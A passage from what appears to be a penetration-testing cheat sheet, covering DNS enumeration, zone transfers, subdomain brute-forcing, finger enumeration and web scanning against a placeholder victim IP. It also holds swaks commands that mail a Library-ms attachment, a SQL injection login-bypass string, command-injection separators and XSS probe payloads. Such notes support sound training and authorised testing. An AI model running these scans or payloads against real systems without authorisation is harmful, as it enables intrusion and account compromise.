-u \u0026quot;Subject text\u0026quot; -m \u0026quot;Message body text.\u0026quot; -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME -xp PASSWORD]\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e first create attachment and body files\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e then send email with swaks\u003c/span\u003e\nswaks -t recipient@example.com -t recipient2@example.com --from sender@example.com --attach @config.Library-ms --server SMTP_SERVER --body @body.txt --header \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSubject: Need help\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e --suppress-data -ap\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e another option is the sendemail tool:\u003c/span\u003e\nsendemail -f sender@example.com -t receiver@example.com -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSubject text\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -m \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eMessage body text.\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -a FILE_ATTACHMENT -s SMTP_SERVER [-xu USERNAME \u003cspan class=\"pl-k\"\u003e-x\u003c/span\u003ep PASSWORD]\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSee \u003ca href=\"https://book.hacktricks.xyz/pentesting/pentesting-smtp\" rel=\"nofollow\"\u003eHackTricks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.4 DNS - 53\u003c/h2\u003e\u003ca id=\"user-content-24-dns---53\" class=\"anchor\" aria-label=\"Permalink: 2.4 DNS - 53\" href=\"#24-dns---53\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePRO TIP\u003c/strong\u003e: Make sure you add the DNS entries you discover to your\n\u003ccode\u003e/etc/hosts\u003c/code\u003e file. Some web servers do redirection based on domain name!\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eFormat of \u003ccode\u003e/etc/hosts\u003c/code\u003e entry with multiple subdomains\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"10.10.10.10     victim.com mail.victim.com www.victim.com admin.victim.com\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e10.10.10.10     victim.com mail.victim.com www.victim.com admin.victim.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eGeneral Purpose Enumeration\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# dnsenum does full recon, including attempting zone transfers and bruteforcing\n# specify \u0026quot;--noreverse\u0026quot; to avoid reverse-IP lookups\ndnsenum domain.tld\n\n# can also use dnsrecon, but takes a little more work to specify full enumeration\ndnsrecon -a -s -b -y -k -w -d domain.tld\n\n# fierce does a more abbreviated full-enumeration (good for preliminary look)\nfierce --domain domain.tld\n\n# dig zone xfer, note \u0026quot;@\u0026quot; before nameserver\ndig @ns1.domain.tld -t axfr domain.tld\n\n# get DNS records by type (MX in this case)\nhost -t MX example.com\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dnsenum does full recon, including attempting zone transfers and bruteforcing\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e specify \"--noreverse\" to avoid reverse-IP lookups\u003c/span\u003e\ndnsenum domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can also use dnsrecon, but takes a little more work to specify full enumeration\u003c/span\u003e\ndnsrecon -a -s -b -y -k -w -d domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e fierce does a more abbreviated full-enumeration (good for preliminary look)\u003c/span\u003e\nfierce --domain domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dig zone xfer, note \"@\" before nameserver\u003c/span\u003e\ndig @ns1.domain.tld -t axfr domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get DNS records by type (MX in this case)\u003c/span\u003e\nhost -t MX example.com\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eDNS Queries on Windows:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"nslookup www.example.com\n\n# Advanced, specify record type and nameserver\nnslookup -type=TXT www.example.com ns1.nameserver.com\"\u003e\u003cpre\u003enslookup \u003cspan class=\"pl-c1\"\u003ewww.example.com\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Advanced, specify record type and nameserver\u003c/span\u003e\nnslookup \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003etype\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003eTXT \u003cspan class=\"pl-c1\"\u003ewww.example.com\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ens1.nameserver.com\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eCommon record types\u003c/strong\u003e:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003eNS\u003c/code\u003e: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eA\u003c/code\u003e: Also known as a host record, the \"A record\" contains the IP address of a hostname (such as \u003ca href=\"http://www.example.com\" rel=\"nofollow\"\u003ewww.example.com\u003c/a\u003e).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eMX\u003c/code\u003e: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePTR\u003c/code\u003e: Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCNAME\u003c/code\u003e: Canonical Name Records are used to create aliases for other host records.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eTXT\u003c/code\u003e: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.4.1 DNS Zone Transfer\u003c/h3\u003e\u003ca id=\"user-content-241-dns-zone-transfer\" class=\"anchor\" aria-label=\"Permalink: 2.4.1 DNS Zone Transfer\" href=\"#241-dns-zone-transfer\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis is basically asking for a copy of all DNS entries served by an authoritative server.\nIt lets you get a list of other subdomains that might be of interest.\nIf a server is configured properly, it won't give you this info.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using dnsrecon\ndnsrecon -t axfr -d domain.tld\n\n# using dig, note \u0026quot;@\u0026quot; before nameserver\ndig @ns1.nameserver.tld axfr domain.tld\n\n# using host (order of args matters)\nhost -l domain.tld ns1.nameserver.tld\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using dnsrecon\u003c/span\u003e\ndnsrecon -t axfr -d domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using dig, note \"@\" before nameserver\u003c/span\u003e\ndig @ns1.nameserver.tld axfr domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using host (order of args matters)\u003c/span\u003e\nhost -l domain.tld ns1.nameserver.tld\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.4.2 Bruteforcing DNS Records\u003c/h3\u003e\u003ca id=\"user-content-242-bruteforcing-dns-records\" class=\"anchor\" aria-label=\"Permalink: 2.4.2 Bruteforcing DNS Records\" href=\"#242-bruteforcing-dns-records\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using dnsrecon\ndnsrecon -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t brt -d domain.tld\n\n# specifying a file with dnsenum, also performs normal full enum\ndnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.tld\n\n# using nmap dns-brute script\nnmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld\n\n# scan through list of subdomains/hostnames using just bash\nfor subdomain in $(cat list.txt); do host $subdomain.example.com; done\n\n# scan through IP space doing reverse DNS lookups\nfor oct in $(seq 1 254); do host 192.168.69.$oct; done | grep -v \u0026quot;not found\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using dnsrecon\u003c/span\u003e\ndnsrecon -D /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t brt -d domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e specifying a file with dnsenum, also performs normal full enum\u003c/span\u003e\ndnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using nmap dns-brute script\u003c/span\u003e\nnmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e scan through list of subdomains/hostnames using just bash\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003esubdomain\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ecat list.txt\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e host \u003cspan class=\"pl-smi\"\u003e$subdomain\u003c/span\u003e.example.com\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edone\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e scan through IP space doing reverse DNS lookups\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eoct\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003eseq 1 254\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e host 192.168.69.\u003cspan class=\"pl-smi\"\u003e$oct\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edone\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003enot found\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.5 Finger - 79\u003c/h2\u003e\u003ca id=\"user-content-25-finger---79\" class=\"anchor\" aria-label=\"Permalink: 2.5 Finger - 79\" href=\"#25-finger---79\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf the \u003ccode\u003efinger\u003c/code\u003e service is running, it is possible to enumerate usernames.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"nmap -vvv -Pn -sC -sV -p79 $VICTIM_IP\"\u003e\u003cpre\u003enmap -vvv -Pn -sC -sV -p79 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6 HTTP(s) - 80,443\u003c/h2\u003e\u003ca id=\"user-content-26-https---80443\" class=\"anchor\" aria-label=\"Permalink: 2.6 HTTP(s) - 80,443\" href=\"#26-https---80443\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eScans to run every time:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# enumerate version info of tech stack, find emails, domains, etc.\nwhatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP\n# to passively accomplish the same thing on a real site, use https://www.wappalyzer.com/\n\n# Gobuster directory/file discovery\n# Other extensions to add: asp,aspx,jsp,cgi,pl,py,sh,\nulimit -n 8192 # prevent file access error during scanning\ngobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x \u0026quot;txt,htm,html,php\u0026quot; -o gobuster-common.txt -u http://$VICTIM_IP\n\n# look for common vulns with nikto\n# -C all means scan all cgi-dirs\nnikto -o nikto.txt --maxtime=180s -C all -h $VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enumerate version info of tech stack, find emails, domains, etc.\u003c/span\u003e\nwhatweb -v -a3 --log-verbose whatweb.txt \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to passively accomplish the same thing on a real site, use https://www.wappalyzer.com/\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Gobuster directory/file discovery\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Other extensions to add: asp,aspx,jsp,cgi,pl,py,sh,\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eulimit\u003c/span\u003e -n 8192 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e prevent file access error during scanning\u003c/span\u003e\ngobuster dir -ezqrkw /usr/share/dirb/wordlists/common.txt -t 100 -x \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003etxt,htm,html,php\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -o gobuster-common.txt -u http://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for common vulns with nikto\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -C all means scan all cgi-dirs\u003c/span\u003e\nnikto -o nikto.txt --maxtime=180s -C all -h \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eChecklist:\u003c/p\u003e\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Check \u003ccode\u003esearchsploit\u003c/code\u003e for vulns in server software, web stack\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Check \u003ccode\u003e/robots.txt\u003c/code\u003e and \u003ccode\u003e/sitemap.xml\u003c/code\u003e for directories/files of interest\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Inspect HTML comments/source for juicy info\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e secrets/passwords\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e directories of interest\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e software libraries in use\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Inspect SSL certs for DNS subdomains and emails\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Watch out for \u003ca href=\"https://httpd.apache.org/docs/current/vhosts/%7CApache%20virtual%20hosts.md\" rel=\"nofollow\"\u003eApache virtual hosts\u003c/a\u003e (and nginx/IIS/etc. equivalents)! Set \u003ccode\u003e/etc/hosts\u003c/code\u003e with ALL (sub)domains for the target IP.\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Attempt login with default/common creds\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Attempt login auth bypass (SQLi): \u003ccode\u003e' or 1=1 -- #\u003c/code\u003e\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Test for \u003ca href=\"#3.5.3%20SQL%20Injection\"\u003eSQL/NoSQL Injection\u003c/a\u003e using \"bad\" chars: \u003ccode\u003e'\")}$%%;\\\u003c/code\u003e\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Test for \u003ca href=\"#3.5.6%20Command%20Injection\"\u003eCommand Injection\u003c/a\u003e\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e separator characters: \u003ccode\u003e; | \u0026amp; || \u0026amp;\u0026amp;\u003c/code\u003e\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e quoted context escape: \u003ccode\u003e\" '\u003c/code\u003e\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e UNIX subshells: \u003ccode\u003e$(cmd)\u003c/code\u003e, \u003ccode\u003e\u0026gt;(cmd)\u003c/code\u003e and backticks\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Test for \u003ca href=\"#3.5.4%20Directory%20Traversal\"\u003ePath Traversal\u003c/a\u003e in URL query and (arbitrary?) file upload\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Test for \u003ca href=\"#3.5.5%20LFI/RFI\"\u003eLFI/RFI\u003c/a\u003e, especially in URL query params\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Test for \u003ca href=\"#3.5.7%20Cross-Site%20Scripting%20(XSS)\"\u003eXSS\u003c/a\u003e on all input fields, URL query params, and HTTP Headers:\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Check what remains after filtering applied on input: \u003ccode\u003e'';!--\"\u0026lt;XSS\u0026gt;=\u0026amp;{()}\u003c/code\u003e\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" id=\"\" disabled=\"\" class=\"task-list-item-checkbox\"\u003e Try variations of \u003ccode\u003e\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.6.1 Web Scanning/Enumeration\u003c/h3\u003e\u003ca id=\"user-content-261-web-scanningenumeration\" class=\"anchor\" aria-label=\"Permalink: 2.6.1 Web Scanning/Enumeration\" href=\"#261-web-scanningenumeration\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhatweb shows details about tech stacks in use by server, email addresses found, etc.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP\n# -v  : verbose\n# -a3 : agressive scan\n# --log-verbose \u0026lt;file\u0026gt; : save scan output to file\n# also supports setting Cookies, HTTP BasicAuth, and proxies\"\u003e\u003cpre\u003ewhatweb -v -a3 --log-verbose whatweb.txt \u003cspan 